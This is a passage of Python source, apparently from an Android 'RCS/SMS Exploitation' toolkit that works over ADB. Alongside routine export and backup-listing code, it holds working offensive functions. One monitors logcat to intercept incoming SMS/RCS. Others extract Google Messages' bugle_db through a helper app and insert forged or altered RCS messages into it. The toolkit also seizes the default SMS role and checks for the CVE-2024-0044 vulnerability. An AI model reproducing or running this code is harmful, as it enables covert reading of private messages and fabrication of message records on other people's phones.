            msgs = self.get_messages_by_address(address)
        else:
            msgs = self.read_sms_database(limit=10000)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        suffix = f'_{address}' if address else '_all'

        if fmt == 'csv':
            export_path = self._exports_dir / f'export{suffix}_{timestamp}.csv'
            with open(export_path, 'w', newline='') as f:
                if msgs:
                    writer = csv.DictWriter(f, fieldnames=msgs[0].keys())
                    writer.writeheader()
                    writer.writerows(msgs)
        elif fmt == 'xml':
            export_path = self._exports_dir / f'export{suffix}_{timestamp}.xml'
            self._write_sms_backup_xml(msgs, str(export_path))
        else:
            export_path = self._exports_dir / f'export{suffix}_{timestamp}.json'
            with open(export_path, 'w') as f:
                json.dump(msgs, f, indent=2, default=str)

        return {
            'ok': True,
            'path': str(export_path),
            'count': len(msgs),
            'format': fmt,
        }

    def list_backups(self) -> Dict[str, Any]:
        """List all backup files."""
        backups = []
        for f in sorted(self._backups_dir.iterdir(), reverse=True):
            if f.is_file():
                backups.append({
                    'name': f.name,
                    'path': str(f),
                    'size': f.stat().st_size,
                    'modified': datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
                })
        return {'ok': True, 'backups': backups, 'count': len(backups)}

    def list_exports(self) -> Dict[str, Any]:
        """List all exported files."""
        exports = []
        for f in sorted(self._exports_dir.iterdir(), reverse=True):
            if f.is_file():
                exports.append({
                    'name': f.name,
                    'path': str(f),
                    'size': f.stat().st_size,
                    'modified': datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
                })
        return {'ok': True, 'exports': exports, 'count': len(exports)}

    def list_extracted_dbs(self) -> Dict[str, Any]:
        """List extracted database snapshots."""
        extractions = []
        for d in sorted(self._extracted_dir.iterdir(), reverse=True):
            if d.is_dir():
                files = [f.name for f in d.iterdir()]
                total_size = sum(f.stat().st_size for f in d.iterdir() if f.is_file())
                extractions.append({
                    'name': d.name,
                    'path': str(d),
                    'files': files,
                    'total_size': total_size,
                })
        return {'ok': True, 'extractions': extractions, 'count': len(extractions)}

    # ══════════════════════════════════════════════════════════════════════
    # §11  SMS/RCS MONITOR
    # ══════════════════════════════════════════════════════════════════════

    def start_sms_monitor(self) -> Dict[str, Any]:
        if self._monitor_running:
            return {'ok': False, 'error': 'Monitor already running'}
        self._monitor_running = True
        self._monitor_thread = threading.Thread(
            target=self._monitor_loop, daemon=True, name='rcs-monitor',
        )
        self._monitor_thread.start()
        return {'ok': True, 'message': 'SMS/RCS monitor started'}

    def stop_sms_monitor(self) -> Dict[str, Any]:
        self._monitor_running = False
        return {'ok': True, 'message': 'Monitor stopping',
                'intercepted': len(self._intercepted)}

    def get_intercepted_messages(self) -> Dict[str, Any]:
        with self._intercepted_lock:
            msgs = list(self._intercepted)
        return {'ok': True, 'messages': msgs, 'count': len(msgs)}

    def clear_intercepted(self) -> Dict[str, Any]:
        with self._intercepted_lock:
            count = len(self._intercepted)
            self._intercepted.clear()
        return {'ok': True, 'cleared': count}

    def _monitor_loop(self):
        """Background thread: watch logcat for incoming SMS/RCS."""
        adb = self._get_adb()
        try:
            proc = subprocess.Popen(
                f'{adb} shell logcat -s Bugle:V SmsReceiverService:V '
                f'SmsMessage:V RilReceiver:V',
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            while self._monitor_running:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                if not line:
                    continue
                # Parse relevant log lines
                entry = None
                if 'SMS received' in line or 'received SMS' in line.lower():
                    entry = {'type': 'sms_received', 'raw': line, 'time': datetime.now().isoformat()}
                elif 'RCS' in line and ('received' in line.lower() or 'incoming' in line.lower()):
                    entry = {'type': 'rcs_received', 'raw': line, 'time': datetime.now().isoformat()}
                elif 'SmsMessage' in line:
                    entry = {'type': 'sms_activity', 'raw': line, 'time': datetime.now().isoformat()}
                if entry:
                    with self._intercepted_lock:
                        self._intercepted.append(entry)
                        if len(self._intercepted) > 1000:
                            self._intercepted = self._intercepted[-500:]
            proc.terminate()
        except Exception:
            pass
        finally:
            self._monitor_running = False

    def get_forged_log(self) -> List[Dict[str, Any]]:
        return list(self._forged_log)

    def clear_forged_log(self) -> Dict[str, Any]:
        count = len(self._forged_log)
        self._forged_log.clear()
        return {'ok': True, 'cleared': count}

    # ══════════════════════════════════════════════════════════════════════
    # §12  ARCHON APP INTEGRATION
    # ══════════════════════════════════════════════════════════════════════

    def archon_query(self, action: str, extras: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """Send a command to Archon's MessagingModule via ADB broadcast."""
        cmd = f'shell am broadcast -a com.darkhal.archon.{action}'
        if extras:
            for key, val in extras.items():
                if isinstance(val, int):
                    cmd += f' --ei {key} {val}'
                elif isinstance(val, bool):
                    cmd += f' --ez {key} {str(val).lower()}'
                else:
                    safe = str(val).replace('"', '\\"')
                    cmd += f' --es {key} "{safe}"'
        cmd += ' com.darkhal.archon'
        result = self._run_adb(cmd)
        return {
            'ok': 'Broadcast completed' in result,
            'result': result,
        }

    def archon_extract_bugle(self) -> Dict[str, Any]:
        """Ask Archon to extract bugle_db via Shizuku elevated access."""
        return self.archon_query('EXTRACT_DB', {
            'target_package': 'com.google.android.apps.messaging',
            'database': 'bugle_db',
            'output_dir': '/sdcard/Download/autarch_extract',
        })

    def archon_forge_rcs(self, address: str, body: str, direction: str = 'incoming') -> Dict[str, Any]:
        """Ask Archon to insert RCS message directly into bugle_db."""
        return self.archon_query('FORGE_RCS', {
            'address': address,
            'body': body,
            'direction': direction,
            'timestamp': str(self._ts_ms()),
        })

    def archon_modify_rcs(self, msg_id: int, new_body: str) -> Dict[str, Any]:
        """Ask Archon to modify an RCS message in bugle_db."""
        return self.archon_query('MODIFY_RCS', {
            'msg_id': msg_id,
            'new_body': new_body,
        })

    def archon_get_rcs_threads(self) -> Dict[str, Any]:
        """Get RCS thread list via Archon relay."""
        return self.archon_query('GET_RCS_THREADS')

    def archon_backup_all(self) -> Dict[str, Any]:
        """Full backup via Archon (SMS + MMS + RCS + attachments)."""
        result = self.archon_query('FULL_BACKUP', {
            'output_dir': '/sdcard/Download/autarch_backup',
            'include_rcs': 'true',
            'include_attachments': 'true',
        })
        if result.get('ok'):
            # Pull the backup
            time.sleep(5)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            local_dir = self._backups_dir / f'archon_backup_{timestamp}'
            local_dir.mkdir(parents=True, exist_ok=True)
            pull = self._run_adb(f'pull /sdcard/Download/autarch_backup/ {local_dir}/')
            result['local_path'] = str(local_dir)
            result['pull_result'] = pull
        return result

    def archon_set_default_sms(self) -> Dict[str, Any]:
        """Set Archon as the default SMS/RCS app (enables full message access)."""
        return self.set_default_sms_app('com.darkhal.archon')

    # ══════════════════════════════════════════════════════════════════════
    # §13  PIXEL-SPECIFIC TOOLS
    # ══════════════════════════════════════════════════════════════════════

    def pixel_diagnostics(self) -> Dict[str, Any]:
        """Run Pixel-specific RCS diagnostic commands."""
        results = {}
        # IMS status
        results['ims'] = self._shell('dumpsys telephony_ims')[:3000]
        # Carrier config (extract RCS-relevant keys)
        cc = self.get_carrier_config()
        results['carrier_rcs_config'] = cc.get('rcs_config', {})
        # Phone info
        results['phone'] = self._shell('dumpsys phone | head -50')
        # Check if Pixel
        brand = self._shell('getprop ro.product.brand').lower()
        results['is_pixel'] = 'google' in brand
        # RCS-specific settings
        results['rcs_settings'] = {}
        for key in ['rcs_autoconfiguration_enabled', 'rcs_e2ee_enabled',
                     'chat_features_enabled']:
            val = self._shell(f'settings get global {key}')
            if not self._is_error(val):
                results['rcs_settings'][key] = val
        return {'ok': True, **results}

    def enable_debug_menu(self) -> Dict[str, Any]:
        """Instructions and automation for enabling Google Messages debug menu."""
        return {
            'ok': True,
            'instructions': [
                '1. Open Google Messages on the device',
                '2. Tap the search bar',
                '3. Type: *xyzzy*',
                '4. A debug menu will appear in Settings',
                '5. Enables: RCS connection state, ACS URL, feature flags, verbose logging',
            ],
            'automated_phenotype': 'Use enable_verbose_logging() to enable debug flags via Phenotype',
        }

    # ══════════════════════════════════════════════════════════════════════
    # §14  CLI ENTRY POINT
    # ══════════════════════════════════════════════════════════════════════

    def run(self):
        """CLI interactive mode."""
        print(f"\n  RCS/SMS Exploitation v{VERSION}")
        print("  " + "=" * 40)
        status = self.get_status()
        if status.get('connected'):
            dev = status['device']
            print(f"  Device: {dev.get('model', '?')} ({dev.get('serial', '?')})")
            print(f"  Android: {dev.get('android_version', '?')} (patch: {dev.get('security_patch', '?')})")
            print(f"  SMS App: {dev.get('default_sms_app', '?')}")
            shizuku = status.get('shizuku', {})
            print(f"  Shizuku: {'running' if shizuku.get('running') else 'not running'}")
            archon = status.get('archon', {})
            print(f"  Archon: {'installed' if archon.get('installed') else 'not installed'}")
            cve = status.get('cve_2024_0044', {})
            if cve.get('vulnerable'):
                print(f"  CVE-2024-0044: VULNERABLE")
        else:
            print("  No device connected")


def run():
    get_rcs_tools().run()
